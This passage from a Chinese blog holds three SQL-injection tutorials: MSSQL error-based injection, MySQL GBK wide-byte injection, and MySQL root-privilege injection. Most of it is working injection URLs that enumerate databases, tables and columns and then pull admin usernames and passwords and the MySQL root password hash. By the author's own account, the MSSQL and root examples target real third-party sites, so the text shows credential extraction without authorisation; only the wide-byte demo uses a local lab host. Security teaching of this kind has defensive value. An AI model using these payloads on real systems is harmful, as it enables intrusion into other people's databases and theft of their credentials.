<p>3,我们可以用下面的语句进一步确实目标是否真的为mssql数据库,页面返回正常则是,返回异常则不是,根据返回,没跑了,这确实是个正儿八经的mssql数据库,’sysobjects’是mssql的系统表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> exists(select * from sysobjects)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection5.png" alt="&#39;&#39;"><br></p>
<p>4,好吧,没说的,开始写注入语句,获取当前mssql版本,可知当前数据库版本为 2008R2<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select @@VERSION))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection6.png" alt="&#39;&#39;"><br></p>
<p>5,获取目标机器的机器名,看机器名主要是因为有时候我们想从机器名上得知这个机器大概是干嘛的,有没有可能在内网,都可以通过这个来初步判断下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select  @@servername))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection7.png" alt="&#39;&#39;"><br></p>
<p>6,获取当前的数据库用户名,当前数据库用户名为 ‘easysofts_kiran’,非sa,关于sa权限下的注入利用方式,后续还会有单独说明,今天的重点还是显错注入,所以为了防止跑题,这里就不多说了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select suser_sname()))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection8.png" alt="&#39;&#39;"><br></p>
<p>7,看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=(select count(*) from master..sysobjects where xtype = <span class="string">'x'</span> <span class="keyword">and</span> name = <span class="string">'xp_cmdshell'</span>) --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection9.png" alt="&#39;&#39;"><br></p>
<p>8,看下当前角色是否为数据库管理员,返回如下报错,很显然,并不是<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(SELECT is_srvrolemember(<span class="string">'sysadmin'</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection10.png" alt="&#39;&#39;"><br></p>
<p>9,再看下当前角色是否为db_ownwer,我们很清楚,在这样的权限下我们可以通过各种备份方式往目标的网站目录里写文件(webshell),很显然,也不是<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select  IS_MEMBER(<span class="string">'db_owner'</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection11.png" alt="&#39;&#39;"><br></p>
<p>10,根据上面得到的这些信息,我们发现,这就是个再正常不过的显错mssql数字型注入点,好吧,既然如此,那就按照常规查数据的方式一步步的慢慢来吧<br>首先,获取当前数据库名,如下可知当前数据库名为 ‘easysofts’,db_name()在不带任何参数时表示显示当前数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name()))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection12.png" alt="&#39;&#39;"><br></p>
<p>如下表示第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name(<span class="number">1</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection13.png" alt="&#39;&#39;"><br></p>
<p>如下表示第六个数据库名,像这样重复性的动作,我们依然是可以交给burpsuite来完成<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name(<span class="number">5</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection14.png" alt="&#39;&#39;"><br></p>
<p>当然,在此之前你还可以先统计下总共有多少个库,这样,我们在burpsuite中设置payload的时候就可以更精确点了,节省时间,不过,如果你直接使用下面的语句可能会报错<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)+CHAR(<span class="number">58</span>)+(SELECT top <span class="number">1</span> CAST(COUNT([name]) AS nvarchar(<span class="number">4000</span>)) FROM [master]..[sysdatabases] )+CHAR(<span class="number">58</span>)+CHAR(<span class="number">58</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection27.png" alt="&#39;&#39;"><br></p>
<p>把里面的’+’换成%2b即可解决问题,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT([name]) AS nvarchar(<span class="number">4000</span>)) FROM [master]..[sysdatabases] )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection25.png" alt="&#39;&#39;"><br></p>
<p>11,获取当前数据库中的所有表名<br>如下表示获取当前库的第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection15.png" alt="&#39;&#39;"><br></p>
<p>通过not in条件,把每次查出来的表名都加进去,这样就可以慢慢把所有的表都遍历出来,如下表示获取第二张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>) ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection16.png" alt="&#39;&#39;"><br></p>
<p>获取第三张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>) ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection17.png" alt="&#39;&#39;"><br></p>
<p>获取第四张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>,<span class="string">'Login'</span>) ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection18.png" alt="&#39;&#39;"><br></p>
<p>利用上面的方法,循环往复,直到报错为止,最后得到所有的表名如下,很显然,’login’就是我们想要的管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>,<span class="string">'Login'</span>,<span class="string">'footer'</span>,<span class="string">'feedback'</span>,<span class="string">'header'</span>,<span class="string">'slider'</span>,<span class="string">'services'</span>,<span class="string">'product'</span>) ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection19.png" alt="&#39;&#39;"><br></p>
<p>当然,你也可以像前面一样,事先统计下当前库中表的总个数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span>  AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT(*) AS nvarchar(<span class="number">4000</span>)) FROM information_schema.TABLES )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection28.png" alt="&#39;&#39;"><br></p>
<p>12,接着,获取’login’表中的所有字段名,获取的方式同上,利用not in依次遍历出所有的字段名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> column_name from information_schema.columns where table_name=<span class="string">'login'</span> ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection20.png" alt="&#39;&#39;"><br></p>
<p>最后,获取的所有字段,名如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vuln.com/Product.aspx?id=8 and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name=&apos;login&apos; and column_name not in(&apos;login_id&apos;,&apos;username&apos;,&apos;password&apos;,&apos;name&apos;)  ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection21.png" alt="&#39;&#39;"><br></p>
<p>13,有了表名,字段名接下来的事情就很好办了,直接去查出对应字段下的数据即可<br>获取username字段下的第一条数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> username from login ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection22.png" alt="&#39;&#39;"><br></p>
<p>获取password字段下的第一条数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> password from login ))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection23.png" alt="&#39;&#39;"><br></p>
<p>统计login中有多少条记录<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT(*) AS nvarchar(<span class="number">4000</span>)) FROM login)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection26.png" alt="&#39;&#39;"><br></p>
<p>假设你在当前库中并没有看到管理表,这时不妨尝试跨库查,前提是你要有权限才行,如下就表示没权限,如果是这样你就要好好想想别的办法了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(SELECT DISTINCT top <span class="number">1</span> TABLE_NAME FROM (SELECT DISTINCT top <span class="number">1</span> TABLE_NAME FROM riseyour_availbgur.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC))--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection24.png" alt="&#39;&#39;"><br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于mssql的注入语句,大家也看到了,跟mysql也差不了多少,都是从information_scheam库中获取各种数据,不过,核心还是利用convert()函数的高级显错特性,多练习多总结即可,里面暂时也没什么特别多的技术含量,比mysql好的地方就是它可能支持堆查询,这样在写注入语句的时候就很方便了,在此只是为了让大家看的更完整一些,所以写的相对比较细,在实际渗透中,怎么简洁,怎么快,怎么方便,怎么搞,完全不用刻意去按照我们的流程来,举一反三,灵活变通才是关键当然,mssql本身还有很多高级特性,但,这不是一两篇文章就能说的清楚的,来日方长,慢慢积累吧……<br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/16/mysql-wide-byte-injection/">
                sql注入入门 之 mysql宽字节注入
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-16</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,如下,宽字节注入的原型实例代码,注意连接字符集为gbk,对传入的值已用addslashes()做了转义,另外,php是把id当做一个字符串来接收的,后面在闭合的时候需要注意下,具体如下:<br><img src="/img/wide_type_1.png" alt="&#39;&#39;"><br></p>
<p>2,本此用于测试的 宽字节注入点,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_2.png" alt="&#39;&#39;"><br></p>
<p>3,这时当我们用经典的单引号尝试对传入参数进行干扰时发现,貌似并没有任何反应,原因很明显,因为addslashes()已经把我们提交的单引号给转义了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_3.png" alt="&#39;&#39;"><br></p>
<p>4,现在,我们就可以尝试利用宽字符来突破类似的转义问题,这里使用经典的%df宽字符,如下,页面返回数据库报错,说明我们的单引号已经被带入正常的sql语句中执行查询了,也就是说,用于转义的那个’\’已经罢工了<br><img src="/img/wide_type_4.png" alt="&#39;&#39;"><br></p>
<p>5,通过观察打出来的sql语句,可以发现,那个 ‘%df’和’\’ 在gbk字符编码中变成了‘運’字,所以这才会造成转义才会失效,既如此,闭合自然就非常简单了,因为是字符型注入,只需要把前面的单引号闭合,后面的语句直接注释掉即可,具体的注入语句如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">'and 1=1 %23   条件为真时返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_5.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 %23 条件为真时返回异常</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/wide_type_6.png" alt="&#39;&#39;"><br></p>
<p>6,查询当前表的字段个数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' order by 3 %23 为3时返回正常</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_7.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' order by 4 %23 为4时返回异常,说明当前表有3个字段</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/wide_type_8.png" alt="&#39;&#39;"><br></p>
<p>7,执行union,爆出对应的数据显示位<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=21 UNION SELECT 1,2,3 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_9.png" alt="&#39;&#39;"><br></p>
<p>8,搜集当前数据库信息,这里只是为了给大家演示下宽字节的正常注入流程,就不再尝试读写文件了,暂时按照正常的权限来,有兴趣可自行尝试<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=21 UNION SELECT 1,database(),version() %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_10.png" alt="&#39;&#39;"><br></p>
<p>9,查出当前库中的所有表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=0x64617461 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_11.png" alt="&#39;&#39;"><br></p>
<p>10,查出admin表中的所有字段名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,group_concat(column_name),user() from information_schema.columns where table_name=0x61646d696e %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_12.png" alt="&#39;&#39;"><br></p>
<p>11,最后,去查出管理的账号密码数据即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,name,pass from admin limit 0,1 %23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/wide_type_13.png" alt="&#39;&#39;"><br><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;篇幅原因,这里只简单演示了GBK一种编码,至于GB2312等其它的一些宽字节字符集,也都会有这样的问题,关于宽字节注入,其实原理非常简单,就是数据库对不同编码的理解差异所造成的,最好的修复方法,就是全站(前后端全局统一)统一用utf-8,在适当的闭合后,注入语句和常规的注入语句基本没有任何差别,记得多找实例练习即可<br><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/15/mysql-root-injection/">
                sql注入入门 之 mysql root权限下的注入利用方式
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-15</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,mysql root权限,实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root1.png" alt="&#39;&#39;"><br></p>
<p>2,尝试用单引号去干扰vid参数,数据库报错,唉,竟然没顺带一起丢出目标网站的物理路径,差评,嘿嘿……<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root2.png" alt="&#39;&#39;"><br></p>
<p>3,尝试闭合<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>   这次看来是个标准的mysql数字型注入了,条件为真时页面返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root3.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> 条件为假时页面返回异常,再次注入点确实存在</span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_root4.png" alt="&#39;&#39;"><br></p>
<p>4,获取当前表的字段个数,为后面union做准备<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> order by <span class="number">31</span> 个数为<span class="number">31</span>目标页面返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root5.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> order by <span class="number">32</span> 个数为<span class="number">32</span>时页面返回错误,可知当前表的字段个数为<span class="number">31</span>个</span><br></pre></td></tr></table></figure>
<p><img src="/img/mysql_root6.png" alt="&#39;&#39;"><br></p>
<p>5,开始执行union爆出对应的数据显示位<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root7.png" alt="&#39;&#39;"><br></p>
<p>6,搜集数据库信息,如下可知,这是个root权限的注入点,既然是root,那就好办了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,user(),<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,version(),<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,@@basedir,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root8.png" alt="&#39;&#39;"><br></p>
<p>7,因为是真实站点,我就不瞎动别人东西了,希望大家也养成这样的习惯,不要随意去碰别人的东西,尤其是一些可能存在潜在危险的敏感操作,这里只是单纯查查肯定是没什么问题了,如果是别的就不一定了,(此后的所有的演示说明都是如此,一律点到为止,杜绝’深入探讨’),后面关于读写文件的操作,等会儿都会留在本地做,这里我们就尝试把它的root的密码hash查出来就可以了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/news</span>_view.php?id=<span class="number">9</span>&amp;vid=<span class="number">192</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,user,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,password,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span> from mysql.user limit <span class="number">0</span>,<span class="number">1</span>  %<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mysql_root8_1.png" alt="&#39;&#39;"><br></p>
